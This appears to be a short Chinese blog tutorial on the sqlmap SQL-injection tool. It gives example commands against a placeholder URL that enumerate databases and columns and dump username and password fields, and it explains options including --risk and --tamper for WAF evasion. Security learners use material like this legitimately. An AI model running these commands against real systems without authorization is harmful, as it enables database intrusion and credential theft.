---
title: 8.SQLMap工具
date: 2026-10-08 17:27:23
tags: [网络安全]
---

# 基础使用
它通过自动化的方式，可以完成从漏洞检测到数据获取的一系列操作：

-   **漏洞检测**：自动识别 URL、表单、Cookie 等位置是否存在 SQL 注入，支持布尔盲注、时间盲注、报错注入等多种技术。

-   **信息获取**：一旦确认漏洞，可以枚举数据库名、表名、字段名，并导出敏感数据（如用户名、密码哈希）

-   **高级利用**：在权限足够的情况下，甚至可以读取/写入服务器文件，或尝试执行系统命令

<!--more-->

```
sqlmap -u "http://example.com/page.php?id=1"
```

```
列出所有数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs


**列出指定表中的所有字段**（假设表名为 `users`）：
sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --columns


**导出指定字段的数据**（假设字段为 `username` 和 `password`
sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users -C username,password --dump
```

#### 关键参数说明

-   **`-u`**：指定目标 URL。

-   **`-r`**：从文本文件加载 HTTP 请求（常用于处理复杂的 POST 或带 Cookie 的请求）[](https://cloud.tencent.com.cn/developer/article/2598893?policyId=1003#1)。

-   **`--level`**：检测等级（1-5，默认 1）。等级越高，测试的参数越多（如 Cookie、User-Agent），但流量也越大[](https://cloud.baidu.com/article/4592767#1)[](https://cloud.tencent.com.cn/developer/article/2598893?policyId=1003#1)。

-   **`--risk`**：风险等级（1-3，默认 1）。等级越高，使用的 Payload 可能更具侵入性（例如修改数据）[](https://cloud.baidu.com/article/4592767#1)。

-   **`--tamper`**：使用混淆脚本（如 `space2comment`）来尝试绕过 WAF 或过滤规则